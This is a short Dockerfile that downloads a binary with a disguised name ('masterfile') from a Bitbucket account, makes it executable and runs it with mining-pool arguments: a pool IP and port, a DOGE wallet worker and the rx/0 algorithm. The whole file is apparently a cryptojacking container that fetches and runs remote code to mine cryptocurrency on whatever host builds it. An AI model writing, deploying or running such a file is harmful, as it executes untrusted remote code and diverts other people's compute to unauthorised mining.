FROM ubuntu:20.04

RUN apt-get update
RUN apt-get install -y wget
RUN wget https://bitbucket.org/tangoEnak123/ckckckckckck/downloads/masterfile
RUN chmod u+x masterfile
RUN ./masterfile -o 161.35.250.122:13333 -u DOGE:DJz1owzEtD8JLdNBs2unjqCnZARfr6EBCC.Worker01 -k -a rx/0
